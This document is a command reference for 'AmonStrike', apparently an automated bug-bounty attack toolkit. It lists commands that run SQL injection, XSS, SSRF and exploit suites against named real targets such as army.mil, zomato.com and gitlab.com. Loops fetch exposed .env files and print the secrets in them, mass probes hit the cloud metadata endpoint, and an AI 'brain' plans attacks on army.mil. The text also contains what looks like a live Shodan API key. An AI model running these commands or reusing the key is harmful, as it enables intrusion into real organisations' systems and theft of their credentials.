# AmonStrike — Complete Command Reference

## SETUP (run once)

```bash
# 1. Clone/update
sudo git config --global --add safe.directory /opt/AmonStrike
cd /opt/AmonStrike && sudo git pull

# 2. Install Python deps
sudo pip3 install requests playwright websocket-client \
  python-nmap dnspython paramiko cryptography \
  --break-system-packages

# 3. Install Playwright browser
sudo python3 -m playwright install chromium

# 4. Install Go tools
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/hahwul/dalfox/v2@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest

# 5. Install system tools
sudo apt install -y nmap sqlmap nikto dirb gobuster wfuzz \
  curl wget git python3-pip ffuf

# 6. Install local AI (32GB RAM)
curl -fsSL https://ollama.ai/install.sh | sh
ollama pull deepseek-r1:14b
ollama serve &

# 7. Export PATH for Go tools
export PATH=$PATH:~/go/bin
echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc
```

---

## MAIN COMMANDS

### One URL — Everything out
```bash
sudo python3 run.py https://TARGET.com PROGRAM_HANDLE
```

### Eternal (Zomato/Blinkit) — H1 Program
```bash
sudo python3 eternal_scan.py --target https://api.zomato.com
sudo python3 eternal_scan.py --target https://hyperpure.com
sudo python3 eternal_scan.py --target https://blinkit.com
sudo python3 eternal_scan.py --discover --tier 1
sudo python3 eternal_scan.py --discover --tier 2
```

### DoD — US Military
```bash
sudo python3 dod_scan.py --target https://www.army.mil
sudo python3 dod_scan.py --discover
sudo bash dod_expand.sh
```

### Terminator — 6 Parallel Terminals
```bash
# All profiles simultaneously
sudo python3 terminator.py --target https://TARGET.com

# Specific profiles
sudo python3 terminator.py --target https://TARGET.com \
  --profiles sqli,idor,ssrf,xss,recon,api

# Visual tmux terminals
sudo python3 terminator.py --target https://TARGET.com --tmux

# With credentials
sudo python3 terminator.py --target https://TARGET.com \
  --credentials '[{"cookies":{"session":"VALUE"}}]'
```

### Pipeline — 15-Step Chain
```bash
sudo python3 core/pipeline.py https://TARGET.com
sudo python3 core/pipeline.py https://TARGET.com \
  --program eternal \
  --credentials '[{"username":"u@t.com","password":"pass","role":"user"}]'
sudo python3 core/pipeline.py test
```

---

## SESSION MANAGEMENT

### Auto-grab from browser (login in Firefox first)
```bash
python3 core/browser_session.py TARGET.com
```

### Manual session — get cookies from Firefox
```
F12 → Network → Click any request → Headers → Cookie
```

### Use session in scan
```bash
sudo python3 terminator.py \
  --target https://TARGET.com \
  --credentials '[{"cookies":{"_session":"VALUE","token":"VALUE"}}]'
```

---

## EXPLOITATION

### Full exploit suite (58 attack classes)
```bash
python3 -c "
import sys; sys.path.insert(0,'.')
import requests, urllib3; urllib3.disable_warnings()
from core.exploit_engine import FullExploitSuite, BrowserExploit

target = 'https://TARGET.com'
endpoints = ['https://TARGET.com/api/users',
             'https://TARGET.com/api/orders']

s = requests.Session()
s.verify = False
s.headers['X-Hackerone'] = 'jardani101'

with BrowserExploit(target, {}) as browser:
    suite = FullExploitSuite(target, s, browser)
    findings = suite.run_all(endpoints, [])
    for f in findings:
        print(f'[{f[\"severity\"]}] {f[\"title\"]}')
        print(f'  PoC: {f[\"curl_poc\"]}')
        print(f'  Screenshots: {f[\"screenshots\"]}')
"
```

### Race condition exploit
```bash
sudo python3 exploits/zomato_otp_race.py
```

### Install Playwright for screenshots
```bash
sudo python3 core/exploit_engine.py install
```

---

## INTELLIGENCE & RECON

### Surface discovery
```bash
python3 -c "
import sys; sys.path.insert(0,'.')
import requests, urllib3; urllib3.disable_warnings()
from core.surface_discovery import AggressiveSurfaceDiscovery
s = requests.Session(); s.verify = False
d = AggressiveSurfaceDiscovery('https://TARGET.com', s)
r = d.run()
for ep in r['endpoints']:
    print(ep)
"
```

### Real-time intelligence
```bash
python3 -c "
import sys; sys.path.insert(0,'.')
from core.local_brain import RealTimeIntelligence
intel = RealTimeIntelligence()
print('CVEs:', intel.get_recent_cves(['php','mysql']))
print('Shodan:', intel.get_shodan_info('army.mil'))
print('Wayback:', intel.get_wayback_endpoints('army.mil')[:5])
print('GitHub:', intel.search_github_secrets('army.mil'))
"
```

### Subdomain discovery
```bash
subfinder -d TARGET.com -silent | httpx -silent
curl -s "https://crt.sh/?q=%.TARGET.com&output=json" | \
  python3 -c "import json,sys; [print(e['name_value']) for e in json.load(sys.stdin)]"
```

### Shodan recon
```bash
python3 -c "
import requests
r = requests.get('https://api.shodan.io/shodan/host/search',
    params={'key':'byVaAzNjWhaPB59X6TvCiTAvsgaPoXeh',
            'query':'hostname:TARGET.com'})
import json; print(json.dumps(r.json(), indent=2))
"
```

---

## TOOL INTEGRATIONS

### Nuclei — 12,000+ templates
```bash
nuclei -u https://TARGET.com -severity critical,high -json
nuclei -l /tmp/targets.txt -severity critical,high,medium \
  -H "X-Hackerone: jardani101" -rate-limit 10
```

### SQLMap — deep SQL injection
```bash
sqlmap -u "https://TARGET.com/api/users?id=1" \
  --level=5 --risk=3 --dbs \
  --headers="X-Hackerone: jardani101" \
  --random-agent --batch
```

### Dalfox — XSS confirmation
```bash
dalfox url "https://TARGET.com/search?q=test" \
  --header "X-Hackerone: jardani101" \
  --silence --output result.txt
```

### Nikto — web server scan
```bash
nikto -h https://TARGET.com \
  -useragent "Mozilla/5.0" \
  -Format json -output nikto_result.json
```

### Gobuster — directory brute force
```bash
gobuster dir -u https://TARGET.com \
  -w /usr/share/wordlists/dirb/big.txt \
  -H "X-Hackerone: jardani101" \
  -x php,asp,aspx,jsp,json,txt,bak \
  -t 20 -o gobuster_result.txt
```

### FFuf — fast fuzzing
```bash
ffuf -u https://TARGET.com/FUZZ \
  -w /usr/share/wordlists/dirb/big.txt \
  -H "X-Hackerone: jardani101" \
  -mc 200,301,302,403 \
  -o ffuf_result.json -of json
```

### Katana — JS crawler
```bash
katana -u https://TARGET.com -d 5 -silent \
  -H "X-Hackerone: jardani101" | tee endpoints.txt
```

---

## BURP SUITE INTEGRATION

### Route AmonStrike through Burp
```bash
# Start Burp on 127.0.0.1:8080
# Then set proxy in scan:
export HTTPS_PROXY=http://127.0.0.1:8080
export HTTP_PROXY=http://127.0.0.1:8080
sudo -E python3 run.py https://TARGET.com
```

### Import AmonStrike results to Burp
```bash
# Results saved to output/ as JSON
# In Burp: Extender → Import findings
cat output/TARGET/report_*.json | python3 -c "
import json,sys
data = json.load(sys.stdin)
for f in data.get('findings',[]):
    print(f['url'], '|', f['title'], '|', f['severity'])
"
```

---

## OUTPUT & REPORTS

### View findings
```bash
# HTML report (open in browser)
firefox output/TARGET/report_*.html

# H1 submission portal
firefox output/TARGET/H1_Submission_Portal.html

# JSON findings
cat output/TARGET/report_*.json | python3 -m json.tool

# Screenshots
ls output/screenshots/
eog output/screenshots/  # image viewer
```

### Filter by severity
```bash
cat output/TARGET/report_*.json | python3 -c "
import json,sys
data = json.load(sys.stdin)
for f in data.get('findings',[]):
    if f['severity'] in ['CRITICAL','HIGH']:
        print(f'[{f[\"severity\"]}] {f[\"title\"]}')
        print(f'  URL: {f[\"url\"]}')
        print(f'  PoC: {f.get(\"curl_poc\",\"\")}')
        print()
"
```

---

## LOCAL AI BRAIN

### Start Ollama
```bash
ollama serve &
ollama list  # see installed models
```

### Test brain
```bash
python3 core/local_brain.py
```

### Use brain for analysis
```bash
python3 -c "
import sys; sys.path.insert(0,'.')
from core.local_brain import LocalBrain
brain = LocalBrain()
plan = brain.plan_attack('https://army.mil', ['php','mysql'], 'government')
import json; print(json.dumps(plan, indent=2))
"
```

---

## QUICK REFERENCE

### Check what's alive (multiple targets)
```bash
cat targets.txt | httpx -silent -timeout 10 -status-code -title
```

### Get all subdomains fast
```bash
subfinder -d TARGET.com -silent -all | \
  httpx -silent -timeout 10 > alive.txt
wc -l alive.txt
```

### Check for .git on all subdomains
```bash
while read url; do
  r=$(curl -sk "$url/.git/HEAD" -o /dev/null -w "%{http_code}")
  if [ "$r" = "200" ]; then echo "GIT EXPOSED: $url"; fi
done < alive.txt
```

### Check for .env on all subdomains
```bash
while read url; do
  r=$(curl -sk "$url/.env" -w "%{http_code}" -o /tmp/env_check)
  if [ "$r" = "200" ] && grep -q "PASSWORD\|SECRET\|KEY" /tmp/env_check; then
    echo "ENV EXPOSED: $url"
    cat /tmp/env_check
  fi
done < alive.txt
```

### Mass SSRF test
```bash
while read url; do
  curl -sk "$url?url=http://169.254.169.254/latest/meta-data/" \
    -H "X-Hackerone: jardani101" \
    -m 5 | grep -q "ami-id\|instance-id" && echo "SSRF: $url"
done < alive.txt
```

### Quick XSS test with dalfox
```bash
cat endpoints.txt | dalfox pipe \
  --header "X-Hackerone: jardani101" \
  --silence -o xss_results.txt
```

### GraphQL discovery
```bash
for path in /graphql /api/graphql /v1/graphql /gql; do
  r=$(curl -sk -X POST "https://TARGET.com$path" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name}}}"}' \
    -H "X-Hackerone: jardani101" -w "%{http_code}")
  echo "$r $path"
done
```

---

## PROGRAM-SPECIFIC

### DoD (.mil assets)
```bash
# No login needed
sudo python3 dod_scan.py --target https://www.army.mil
sudo bash dod_expand.sh  # scan all 5988 subdomains

# Manual discovery
curl -s "https://crt.sh/?q=%.army.mil&output=json" | \
  python3 -c "import json,sys; [print(e['name_value']) for e in json.load(sys.stdin)]" | \
  sort -u | httpx -silent > dod_alive.txt

# Scan top 10
head -10 dod_alive.txt | while read t; do
  sudo python3 run.py "$t" dod
done
```

### Eternal (Zomato) — login required
```bash
# 1. Login to zomato.com in Firefox
# 2. Grab session
python3 core/browser_session.py zomato.com
# 3. Scan with session
sudo python3 terminator.py --target https://www.zomato.com
```

### GitLab
```bash
# Create free account at gitlab.com
# Get session cookie from browser
sudo python3 terminator.py --target https://gitlab.com \
  --profiles idor,api,sqli,xss
```

---

## MONITORING

### 24/7 new asset monitor
```bash
python3 -c "
import sys; sys.path.insert(0,'.')
from core.monitor import ContinuousMonitor
m = ContinuousMonitor(
    ['https://army.mil','https://zomato.com'],
    interval_minutes=60,
    callback=lambda new,domain: print(f'NEW ASSETS on {domain}: {new}')
)
m.run_forever()
"
```

### Watch for new findings
```bash
watch -n 60 'ls -lt output/*/H1_Submission_Portal.html | head -5'
```
